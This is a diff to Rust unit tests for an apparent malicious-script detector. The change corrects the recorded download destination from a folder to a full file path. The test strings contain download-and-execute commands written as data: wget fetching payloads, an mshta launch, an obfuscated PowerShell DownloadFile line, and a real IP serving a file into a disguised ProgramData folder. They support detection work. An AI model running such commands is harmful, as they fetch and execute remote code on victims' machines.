@@ -9160,7 +9160,7 @@ mod wget_tests {
     }
 
     #[test]
-    fn wget_long_directory_prefix_records_destination_prefix() {
+    fn wget_long_directory_prefix_records_destination_file() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
             r#"wget --directory-prefix C:\Temp https://wget-prefix.example/payload.bin"#,
@@ -9178,7 +9178,7 @@ mod wget_tests {
             downloads,
             vec![(
                 "https://wget-prefix.example/payload.bin",
-                Some(r#"C:\Temp"#)
+                Some(r#"C:\Temp\payload.bin"#)
             )],
             "traits: {:?}",
             env.traits
@@ -9219,7 +9219,7 @@ mshta payload.hta"#,
                 t,
                 Trait::Download { src, dst: Some(dst), .. }
                     if src == "https://wget-glued-prefix-mshta.example/payload.hta"
-                        && dst == r#"C:\Temp"#
+                        && dst == r#"C:\Temp\payload.hta"#
             )
         });
         assert!(
@@ -9254,7 +9254,7 @@ mshta payload.hta"#,
                 t,
                 Trait::Download { src, dst: Some(dst), .. }
                     if src == "https://wget-cluster-prefix-mshta.example/payload.hta"
-                        && dst == r#"C:\Temp"#
+                        && dst == r#"C:\Temp\payload.hta"#
             )
         });
         assert!(
@@ -22700,7 +22700,7 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
     }
 
     #[test]
-    fn wget_glued_short_directory_prefix_in_deob_text_records_destination_prefix() {
+    fn wget_glued_short_directory_prefix_in_deob_text_records_destination_file() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
             r#"wget -PC:\Temp https://wget-glued-prefix-deob.example/payload.bin"#,
@@ -22718,7 +22718,7 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
             downloads,
             vec![(
                 "https://wget-glued-prefix-deob.example/payload.bin",
-                Some(r#"C:\Temp"#)
+                Some(r#"C:\Temp\payload.bin"#)
             )],
             "traits: {:?}",
             env.traits
@@ -22726,7 +22726,7 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
     }
 
     #[test]
-    fn wget_clustered_short_directory_prefix_in_deob_text_records_destination_prefix() {
+    fn wget_clustered_short_directory_prefix_in_deob_text_records_destination_file() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
             r#"wget -qPC:\Temp https://wget-cluster-prefix-deob.example/payload.bin"#,
@@ -22744,7 +22744,7 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
             downloads,
             vec![(
                 "https://wget-cluster-prefix-deob.example/payload.bin",
-                Some(r#"C:\Temp"#)
+                Some(r#"C:\Temp\payload.bin"#)
             )],
             "traits: {:?}",
             env.traits
@@ -22894,7 +22894,7 @@ $v = 'fTp:\\var-liberal.example\stage.dat'"#,
             matches!(t,
                 Trait::Download { src, dst, .. }
                     if src == "http://47.76.149.26/17/url2.txt"
-                        && dst.as_deref() == Some("C:\\ProgramData\\WindowsComSvc")
+                        && dst.as_deref() == Some("C:\\ProgramData\\WindowsComSvc\\url2.txt")
             )
         });
         assert!(
@@ -23077,7 +23077,7 @@ $v = 'fTp:\\var-liberal.example\stage.dat'"#,
             matches!(t,
                 Trait::Download { src, dst, .. }
                     if src == "https://wget-prefix-deob.example/payload.bin"
-                        && dst.as_deref() == Some("C:\\Temp")
+                        && dst.as_deref() == Some("C:\\Temp\\payload.bin")
             )
         });
         assert!(
